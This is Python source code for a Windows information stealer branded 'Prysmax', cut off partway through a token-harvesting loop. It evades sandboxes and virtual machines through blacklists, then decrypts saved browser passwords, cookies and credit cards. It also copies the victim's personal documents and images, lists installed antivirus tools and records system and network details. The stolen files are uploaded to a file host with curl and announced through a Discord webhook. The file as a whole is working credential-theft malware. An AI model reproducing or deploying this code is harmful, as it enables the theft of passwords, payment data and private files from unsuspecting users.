import os, requests,shutil, uuid, wmi, psutil, subprocess, glob, re
import platform as platform_module
from discord_webhook import DiscordEmbed, DiscordWebhook

from PIL import ImageGrab
from zipfile import ZipFile
import os
import re
import shutil
import random
import socket
import threading
import subprocess
import getpass
from base64 import b64decode
from json import loads, dumps
from zipfile import ZipFile, ZIP_DEFLATED
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from json import *

bot_token = "here-your-telegram"
chat_id = "here-your-chat-id"  
theapi2023 = "Here-Token"


url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

pc_name = platform_module.node()

blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']

username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)
    
blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']

hostname = socket.gethostname()

if any(name in hostname for name in blacklistUsername):
    os._exit(0)

BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']

mac_address = uuid.getnode()
if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
    os._exit(0)

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")
stop_threads = False
search_in = "Default"
extensions_to_search = ['.png', '.jpg', '.pdf', '.docx'] # If you want to add more, add :))



local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

k3YW0rd = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[stake](https://stake.com)']
C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157, K1W1F113s, B00KM4rK5, T0K3Ns = [], [], [], [], [], [], [], [], [], [], [], [], [], ''

try:gofileserver = loads(urlopen("https://api.gofile.io/servers").read().decode('utf-8'))["data"]["servers"]
except:gofileserver = "store1"


def G37D474(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G37D474(blob_out)

def D3CrYP7V41U3(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16]
            try: decrypted_pass = decrypted_pass.decode()
            except:pass
            return decrypted_pass       
       
def TrU57(C00K13s):
    global DETECTED
    data = str(C00K13s)
    tim = re.findall(".google.com", data)
    DETECTED = True if len(tim) < -1 else False
    return DETECTED

def Wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\prysmax-{pc_name}\pr{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

def SQ17H1N6(pathC, tempfold, cmd):
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(cmd)
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    return data


def r3F0rM47(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def G37P455W(path, arg):
    try:
        global P455w, P455WC0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in k3YW0rd:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in p45WW0rDs: p45WW0rDs.append(old)
                P455w.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3CrYP7V41U3(row[2], master_key)}")
                P455WC0UNt += 1
        Wr173F0rF113(P455w, 'passwords')
    except:pass

def UP104D7060F113(path):
    try:
        r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/contents/uploadfile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
    except: return False

def G37C00K13(path, arg):
    try:
        global C00K13s, C00K1C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies ")

        pathKey = path + "/Local State"

        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in k3YW0rd:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in c00K1W0rDs: c00K1W0rDs.append(old)
                C00K13s.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3CrYP7V41U3(row[2], master_key)}")
                C00K1C0UNt += 1
        Wr173F0rF113(C00K13s, 'cookies')
    except:pass

def G37CC5(path, arg):
    try:
        global CCs, CC5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM credit_cards ")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                CCs.append(f"C4RD N4M3: {row[1]} | NUMB3R: {D3CrYP7V41U3(row[4], master_key)} | EXP1RY: {row[2]}/{row[3]}")
                CC5C0UNt += 1
        Wr173F0rF113(CCs, 'creditcards')
    except:pass

def G374U70F111(path, arg):
    try:
        global AU70F11l, AU70F111C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold,"SELECT * FROM autofill WHERE value NOT NULL")

        for row in data:
            if row[0] != '':
                AU70F11l.append(f"N4M3: {row[0]} | V4LU3: {row[1]}")
                AU70F111C0UNt += 1
        Wr173F0rF113(AU70F11l, 'autofill')
    except:pass

def G37H1570rY(path, arg):
    try:
        global H1570rY, H1570rYC0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "History"
        if os.stat(pathC).st_size == 0: return
        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        data = SQ17H1N6(pathC, tempfold,"SELECT * FROM urls")

        for row in data:
            if row[0] != '':
                H1570rY.append(row[1])
                H1570rYC0UNt += 1
        Wr173F0rF113(H1570rY, 'history')
    except:pass

def G37W3851735(Words):
    rb = ' | '.join(da for da in Words)
    if len(rb) > 1000:
        rrrrr = r3F0rM47(str(Words))
        return ' | '.join(da for da in rrrrr)
    else: return rb

def G37800KM4rK5(path, arg):
    try:
        global B00KM4rK5, B00KM4rK5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "Bookmarks"
        if os.path.exists(pathC):
            with open(pathC, 'r', encoding='utf8') as f:
                data = loads(f.read())
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        B00KM4rK5.append(f"N4M3: {i['name']} | UR1: {i['url']}")
                        B00KM4rK5C0UNt += 1
                    except:pass
        if os.stat(pathC).st_size == 0: return
        Wr173F0rF113(B00KM4rK5, 'bookmarks')
    except:pass
    
def shearderx(func, arg):
    global Browserthread
    t = threading.Thread(target=func, args=arg)
    t.start()
    Browserthread.append(t)




try:
 if not os.path.exists(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}'):
    os.mkdir(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}')
 shutil.move(user+f'\\AppData\\Local\\Temp\\Browser.zip', user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}')
except:
    pass

def find_antivirus_folders(base_folder):
    antivirus_names = [
        "Avast", "AVG", "Bitdefender", "Kaspersky", "McAfee", "Norton", "Sophos"
        "ESET", "Malwarebytes", "Avira", "Panda", "Trend Micro", "F-Secure", "McAfee", "Comodo", "Avira", 
        "BullGuard", "360 Total Security", "Ad-Aware", "Dr.Web", "G-Data", "Vipre", "ClamWin", "ZoneAlarm",
        "Cylance", "Webroot", "Cylance", "Palo Alto Networks", "Symantec", "SentinelOne", "CrowdStrike",
        "Emsisoft", "HitmanPro", "Fortinet", "Trend Micro", "Emsisoft", "FireEye", "Cylance", "ESET",
        "Zemana", "McAfee", "Windows Defender", "ReasonLabs"
    ]
    antivirus_folders_dict = {}

    antivirus_folders_set = set()

    for folder in os.listdir(base_folder):
        full_path = os.path.join(base_folder, folder)

        if os.path.isdir(full_path):
            for antivirus_name in antivirus_names:
                if antivirus_name.lower() in folder.lower():
                    antivirus_folders_dict[antivirus_name] = folder

    return antivirus_folders_dict

    return antivirus_folders_set


 
def getbroxk(br0W53rP47H5):
    
    try:
        global Browserthread
        ThCokk, Browserthread, filess = [], [], []
        for patt in br0W53rP47H5:
            a = threading.Thread(target=G37C00K13, args=[patt[0], patt[4]])
            a.start()
            ThCokk.append(a)

            shearderx(G374U70F111,       [patt[0], patt[3]])
            shearderx(G37H1570rY,        [patt[0], patt[3]])
            shearderx(G37800KM4rK5,      [patt[0], patt[3]])
            shearderx(G37CC5,            [patt[0], patt[3]])
            shearderx(G37P455W,          [patt[0], patt[3]])

        for thread in ThCokk: thread.join()
        if TrU57(C00K13s) == True: __import__('sys').exit(0)
        for thread in Browserthread: thread.join()

        for file in ["prpasswords.txt", "prcookies.txt", "prcreditcards.txt", "prautofills.txt", "prhistories.txt", "prbookmarks.txt"]:
            filess.append(UP104D7060F113(temp + f"prysmax-{pc_name}\\" + file))

    except Exception as rjjk:
        print(f"Error generando credenciales, {rjjk}")
    whpass = DiscordWebhook(url=theapi2023, username="Prysmax Software", avatar_url="https://i.imgur.com/jJES3AX.png")

    embedp = DiscordEmbed(title='Prysmax | Passwords', description=f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [PrysmaPasswords.txt]({filess[0]})", color=0x040101)

    embedp.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/jJES3AX.png')
    embedp.set_thumbnail(url='https://i.imgur.com/jJES3AX.png')


    embedp.set_footer(text='t.me/lawxsz')  
    
    embedc = DiscordEmbed(title='Prysmax | Cookies', description=f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [PrysmaCookies.txt]({filess[1]})")
    embedc.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/jJES3AX.png')
    embedc.set_thumbnail(url='https://i.imgur.com/jJES3AX.png')


    embedc.set_footer(text='t.me/lawxsz')  
    
    
    embedb = DiscordEmbed(title='Prysmax | Browsers Data', description=f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n<a:CH_IconArrowRight:715585320178941993> • [PrysmaHistories.txt]({filess[4]})\n\n<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n<a:CH_IconArrowRight:715585320178941993> • [PrysmaAutofills.txt]({filess[3]})\n\n<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n<a:CH_IconArrowRight:715585320178941993> • [PrysmaCreditCards.txt]({filess[2]})\n\n:bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n<a:CH_IconArrowRight:715585320178941993> • [PrysmaBookmarks.txt]({filess[5]})")

    embedb.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/jJES3AX.png')
    embedb.set_thumbnail(url='https://i.imgur.com/jJES3AX.png')


    embedb.set_footer(text='t.me/lawxsz')  
    
      
    
    whpass.add_embed(embedp)
    whpass.add_embed(embedc)
    whpass.add_embed(embedb)

    whpass.execute()

    return

def akakx2(meth, args = []):
    a = threading.Thread(target=meth, args=args)
    a.start()
    THr34D1157.append(a)

def G47H3r411():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                 Password/CC < 3 >     Cookies < 4 >                 Extentions < 5 >                           '
    bropat = [    
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
    ]


    akakx2(getbroxk,   [bropat,]                                      )

def search_and_copy_files(start_folder, dest_folder, search_all=False):
    specific_folders = ['Desktop', 'Documents', 'Downloads', 'Pictures']

    for root, dirs, files in os.walk(start_folder):
        if not search_all:
            dirs[:] = [d for d in dirs if d in specific_folders]

        for file in files:
            file_path = os.path.join(root, file)
            _, extension = os.path.splitext(file_path)

            if extension.lower() in extensions_to_search:
                destination_path = os.path.join(dest_folder, file)
                shutil.copy(file_path, destination_path)
                print(f"Stealing {file_path} to {destination_path}")
def machine_info():
    G47H3r411()

    mem = psutil.virtual_memory()

    c = wmi.WMI()
    for gpu in c.Win32_DisplayConfiguration():
        GPUm = gpu.Description.strip()
        
    current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode('utf-8').split('\n')[1].strip()
    try:
        with os.popen('wmic path softwarelicensingservice get OA3xOriginalProductKey') as process:
            resultado = process.read()
            clave_producto = resultado.split('\n')[1].strip()
    except Exception as e:
        clave_producto = str(e)

    # pc info
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])

    
    pc_os = platform_module.platform()
    pc_cpu = platform_module.processor()
    pc_hwid = current_machine_id
    pc_ram = mem.total / 1024**3
    pc_gpu = GPUm
    pc_key = clave_producto
    if pc_key == None:
        pc_key = "Nothing"

    # network info
    getip = requests.get("http://ip-api.com/json/").json()
    theip = getip["query"]
    ip = requests.get(f"http://ip-api.com/json/{theip}?fields=192511").json()
    ip_country = ip.get("country", "Error")
    ip_region = ip.get("regionName", "Error")
    ip_city = ip.get("city", "Error")
    ip_isp = ip.get("isp", "Error")
    ip_proxy = ip.get("proxy", "Error")
    
    tasklists = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
    
    main_folders = [os.path.expanduser("~"), os.getenv('LOCALAPPDATA'), os.getenv('APPDATA')]
    
    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\files'):
     os.mkdir(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\files')

    
    
    if search_in == "Default":
     for folder in main_folders:
        search_and_copy_files("C:\\", user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\files')
    else:
        search_and_copy_files("C:\\", user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\files', search_all=False)
    

    antivirus_folders = find_antivirus_folders("C:\\Program Files")

    if antivirus_folders:
        print("Antivirus encontrados:")
        for antivirus_name, folder_name in antivirus_folders.items():
            print(f"{antivirus_name}: {folder_name}")
    else:
        print("not foun.")
        

    
    
    process_task = False
    if tasklists.returncode == 0:
     with open(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\process_list.txt', 'w') as file:
        file.write(tasklists.stdout)
     print('The process list has been saved in "process_list.txt".')
     num_procesos = tasklists.stdout.count('\n') - 3
     process_task = True
    else:
     print('There was an error in obtaining the list of processes.')
     process_task = False
    with open(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\information.txt', 'w', encoding='utf-8') as archivo:
        archivo.write(f"""
                      
        ¡PRYSMAX STEALER!
        
    ╠       Network Info🌐                 
    ╠     IP: {theip}
    ╠     Country: {ip_country}
    ╠     Region: {ip_region}
    ╠     City: {ip_city}
    ╠     Vpn: {ip_proxy}
    ╠      ISP: {ip_isp}
    ╠
    
    ╠     Machine Info 🖥 
    ╠   Pc Name: {pc_name}
    ╠   OS: {pc_os}
    ╠   CPU: {pc_cpu}
    ╠   HWID: {pc_hwid}
    ╠   RAM: {pc_ram}
    ╠   GPU: {pc_gpu}
    ╠   Windows Key: {pc_key}
    ╠   Antiviruses: {antivirus_name}
        List of process: {num_procesos}

""")
    tokens = []
    local = os.getenv("localAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
            "Discord"               : roaming + "\\Discord",
            "Discord Canary"        : roaming + "\\discordcanary",
            "Discord PTB"           : roaming + "\\discordptb",
            "Google Chrome"         : local + "\\Google\\Chrome\\User Data\\Default",
            "Opera"                 : roaming + "\\Opera Software\\Opera Stable",
            "Brave"                 : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"                : local + "\\Yandex\\YandexBrowser\\User Data\\Default",
            'Lightcord'             : roaming + "\\Lightcord",
            'Opera GX'              : roaming + "\\Opera Software\\Opera GX Stable",
            'Amigo'                 : local + "\\Amigo\\User Data",
            'Torch'                 : local + "\\Torch\\User Data",
            'Kometa'                : local + "\\Kometa\\User Data",
            'Orbitum'               : local + "\\Orbitum\\User Data",
            'CentBrowser'           : local + "\\CentBrowser\\User Data",
            'Sputnik'               : local + "\\Sputnik\\Sputnik\\User Data",
            'Chrome SxS'            : local + "\\Google\\Chrome SxS\\User Data",
            'Epic Privacy Browser'  : local + "\\Epic Privacy Browser\\User Data",
            'Microsoft Edge'        : local + "\\Microsoft\\Edge\\User Data\\Default",
            'Uran'                  : local + "\\uCozMedia\\Uran\\User Data\\Default",
            'Iridium'               : local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
            'Firefox'               : roaming + "\\Mozilla\\Firefox\\Profiles",
        }
    Discord = False
    for platform, path in paths.items():
        path = os.path.join(path, "local Storage", "leveldb")
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                    with open(os.path.join(path, file_name), errors="ignore") as file:
